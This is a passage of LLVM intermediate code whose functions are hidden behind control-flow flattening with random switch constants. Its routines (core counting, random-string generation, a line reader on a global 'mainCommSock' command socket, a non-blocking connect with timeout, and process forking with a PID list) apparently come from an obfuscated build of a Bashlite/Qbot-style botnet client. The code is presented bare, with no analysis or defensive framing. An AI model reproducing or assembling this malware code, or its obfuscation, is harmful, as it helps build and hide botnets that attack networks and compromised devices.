  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %15)
  %16 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %17 = call i8* @strstr(i8* %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %18 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %19 = icmp eq i8* %17, %18
  %20 = select i1 %19, i32 -260118461, i32 1252285398
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %23 = getelementptr inbounds i8, i8* %22, i64 8
  store i8* %23, i8** %6, align 8
  store i32 722107342, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %6, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 32
  %29 = select i1 %28, i32 -1630527480, i32 997886167
  store i32 %29, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i8*, i8** %6, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 9
  %35 = select i1 %34, i32 -1630527480, i32 564123604
  store i32 %35, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 58
  store i32 -1630527480, i32* %switchVar
  store i1 %40, i1* %.reg2mem
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %42 = select i1 %.reload, i32 -698775433, i32 557114895
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8*, i8** %6, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %6, align 8
  store i32 722107342, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 -429227623, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %6, align 8
  %49 = load i8*, i8** %6, align 8
  %50 = call i64 @strlen(i8* %49) #10
  %51 = sub i64 %50, 1
  %52 = getelementptr inbounds i8, i8* %48, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 13
  %56 = select i1 %55, i32 -326005678, i32 -2091396837
  store i32 %56, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8*, i8** %6, align 8
  %59 = load i8*, i8** %6, align 8
  %60 = call i64 @strlen(i8* %59) #10
  %61 = sub i64 %60, 1
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  store i32 -326005678, i32* %switchVar
  store i1 %65, i1* %.reg2mem2
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %67 = select i1 %.reload3, i32 889561501, i32 -1820584222
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %6, align 8
  %71 = call i64 @strlen(i8* %70) #10
  %72 = sub i64 %71, 1
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  store i8 0, i8* %73, align 1
  store i32 -429227623, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** %6, align 8
  %76 = call i8* @strchr(i8* %75, i32 46) #10
  %77 = icmp ne i8* %76, null
  %78 = select i1 %77, i32 233221996, i32 1401655652
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %6, align 8
  %81 = call i8* @strchr(i8* %80, i32 46) #10
  store i8 0, i8* %81, align 1
  store i32 1401655652, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %3, align 8
  %84 = load i8*, i8** %6, align 8
  %85 = call i8* @strcpy(i8* %83, i8* %84) #4
  %86 = load i32, i32* %4, align 4
  %87 = call i32 @close(i32 %86)
  store i32 0, i32* %2, align 4
  store i32 -985218821, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %89, i8 0, i64 4096, i32 16, i1 false)
  store i32 -1440081514, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %4, align 4
  %92 = call i32 @close(i32 %91)
  store i32 1, i32* %2, align 4
  store i32 -985218821, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %2, align 4
  ret i32 %94

loopEnd:                                          ; preds = %90, %88, %82, %79, %74, %68, %66, %57, %47, %46, %43, %41, %36, %30, %24, %21, %14, %8, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #5

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  %switchVar = alloca i32
  store i32 -2082180267, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -2082180267, label %5
    i32 1583065132, label %11
    i32 251966633, label %18
    i32 -1115530157, label %21
    i32 206589920, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  %10 = select i1 %9, i32 1583065132, i32 206589920
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %12)
  %13 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %14 = call i8* @strstr(i8* %13, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %16 = icmp eq i8* %14, %15
  %17 = select i1 %16, i32 251966633, i32 -1115530157
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %1, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %1, align 4
  store i32 -1115530157, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 4096, i32 16, i1 false)
  store i32 -2082180267, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %21, %18, %11, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 753029263, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 753029263, label %6
    i32 -306404131, label %11
    i32 -154748153, label %20
    i32 -1281571964, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 -306404131, i32 -1281571964
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 -154748153, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 753029263, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 -679820792, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -679820792, label %24
    i32 -1851965956, label %33
    i32 -1376096524, label %50
    i32 908517850, label %51
    i32 -1346069338, label %55
    i32 1102668180, label %60
    i32 -1894264158, label %69
    i32 -507916791, label %86
    i32 685455911, label %89
    i32 -1788499235, label %90
    i32 306713769, label %91
    i32 -1379586019, label %93
    i32 -293307163, label %98
    i32 1475590597, label %103
    i32 1263360629, label %105
    i32 -1550744335, label %113
    i32 -122241670, label %114
    i32 2013275027, label %117
    i32 1872194075, label %122
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #4, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 -1851965956, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 -1376096524, i32 306713769
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 908517850, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 -1346069338, i32 -1788499235
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0))
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %58, align 8
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %59, align 8
  store i32 1102668180, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %62 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 0
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %62) #4, !srcloc !2
  %64 = extractvalue { i64, i64* } %63, 0
  %65 = extractvalue { i64, i64* } %63, 1
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %14, align 4
  %67 = ptrtoint i64* %65 to i64
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %15, align 4
  store i32 -1894264158, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %5, align 4
  %71 = srem i32 %70, 64
  %72 = zext i32 %71 to i64
  %73 = shl i64 1, %72
  %74 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %75 = load i32, i32* %5, align 4
  %76 = sdiv i32 %75, 64
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %5, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %83, i32* %12, align 4
  %84 = icmp sle i32 %83, 0
  %85 = select i1 %84, i32 -507916791, i32 685455911
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %13, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %13, align 4
  store i32 908517850, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  store i32 -1788499235, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 306713769, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  %92 = load i8*, i8** %6, align 8
  store i8* %92, i8** %17, align 8
  store i32 -1379586019, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %7, align 4
  %95 = add nsw i32 %94, -1
  store i32 %95, i32* %7, align 4
  %96 = icmp sgt i32 %94, 1
  %97 = select i1 %96, i32 -293307163, i32 2013275027
  store i32 %97, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* @mainCommSock, align 4
  %100 = call i64 @recv(i32 %99, i8* %16, i64 1, i32 0)
  %101 = icmp ne i64 %100, 1
  %102 = select i1 %101, i32 1475590597, i32 1263360629
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  %104 = load i8*, i8** %17, align 8
  store i8 0, i8* %104, align 1
  store i32 -1, i32* %4, align 4
  store i32 1872194075, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i8, i8* %16, align 1
  %107 = load i8*, i8** %17, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %17, align 8
  store i8 %106, i8* %107, align 1
  %109 = load i8, i8* %16, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 10
  %112 = select i1 %111, i32 -1550744335, i32 -122241670
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  store i32 2013275027, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %18, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %18, align 4
  store i32 -1379586019, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %17, align 8
  store i8 0, i8* %118, align 1
  %119 = load i8*, i8** %17, align 8
  %120 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i32 0, i32 0), i8* %119)
  %121 = load i32, i32* %18, align 4
  store i32 %121, i32* %4, align 4
  store i32 1872194075, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32, i32* %4, align 4
  ret i32 %123

loopEnd:                                          ; preds = %117, %114, %113, %105, %103, %98, %93, %91, %90, %89, %86, %69, %60, %55, %51, %50, %33, %24, %switchDefault
  br label %loopEntry
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #5

declare i64 @recv(i32, i8*, i64, i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1066152992, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1066152992, label %first
    i32 -160525098, label %37
    i32 -1054255759, label %38
    i32 -893823029, label %47
    i32 1860907016, label %52
    i32 -1221316691, label %57
    i32 1507827225, label %66
    i32 -3669204, label %83
    i32 1932876761, label %90
    i32 -1811967387, label %91
    i32 1580108645, label %92
    i32 1532882640, label %93
    i32 305802087, label %94
    i32 804975433, label %95
    i32 336244698, label %96
    i32 579675139, label %105
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -160525098, i32 -1054255759
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 579675139, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %40 = getelementptr inbounds [8 x i8], [8 x i8]* %39, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 8, i32 4, i1 false)
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %43 = call i32 @connect(i32 %41, %struct.sockaddr* %42, i32 16)
  store i32 %43, i32* %16, align 4
  %44 = load i32, i32* %16, align 4
  %45 = icmp slt i32 %44, 0
  %46 = select i1 %45, i32 -893823029, i32 336244698
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32* @__errno_location() #13
  %49 = load i32, i32* %48, align 4
  %50 = icmp eq i32 %49, 115
  %51 = select i1 %50, i32 1860907016, i32 305802087
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  store i32 -1221316691, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #4, !srcloc !3
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  store i32 1507827225, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 -3669204, i32 1580108645
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #4
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 1932876761, i32 -1811967387
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 579675139, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 1532882640, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 579675139, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 804975433, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 579675139, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 336244698, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 579675139, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #4
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 936286731, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 936286731, label %first
    i32 91780886, label %9
    i32 -1204336494, label %11
    i32 -1643337389, label %19
    i32 -2108383477, label %26
    i32 -526027684, label %36
    i32 -681681452, label %39
    i32 1759901724, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 91780886, i32 -1204336494
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 1759901724, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #4
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 -1643337389, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 -2108383477, i32 -681681452
  store i32 %25, i32* %switchVar
  br label %loopEnd

